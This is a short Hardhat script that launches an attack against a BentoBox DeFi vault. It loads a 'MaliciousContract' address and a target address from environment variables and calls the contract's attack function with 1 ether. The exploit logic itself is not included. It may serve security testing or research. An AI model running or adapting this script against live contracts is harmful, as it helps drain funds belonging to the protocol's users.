require('dotenv').config();
const { ethers } = require("hardhat");

async function main() {
    // Get the deployer's account
    const [attacker] = await ethers.getSigners();
    console.log("Attacking with the account:", attacker.address);

    // Get the address of the deployed MaliciousContract and BentoBox from environment variables
    const maliciousContractAddress = process.env.MALICIOUS_CONTRACT_ADDRESS;
    const targetBentoBoxAddress = process.env.BENTOBOX_ADDRESS; // The address of the target BentoBox

    // Ensure addresses are defined
    if (!maliciousContractAddress || !targetBentoBoxAddress) {
        console.error("Error: MALICIOUS_CONTRACT_ADDRESS or BENTOBOX_ADDRESS not defined in .env file.");
        process.exit(1);
    }

    // Get the contract instance for MaliciousContract
    const MaliciousContract = await ethers.getContractAt("MaliciousContract", maliciousContractAddress);

    // Amount to attack with (specify the amount in wei)
    const attackAmount = ethers.utils.parseEther("1.0"); // Example: attacking with 1 ether

    // Execute the attack by calling the attack function on MaliciousContract
    try {
        const tx = await MaliciousContract.attack(attackAmount, { value: attackAmount });
        // Wait for the transaction to be mined
        await tx.wait();
        console.log("Attack executed successfully. Transaction Hash:", tx.hash);
    } catch (error) {
        console.error("Error executing attack:", error);
    }
}

// Execute the attack script
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error("Error running the script:", error);
        process.exit(1);
    });
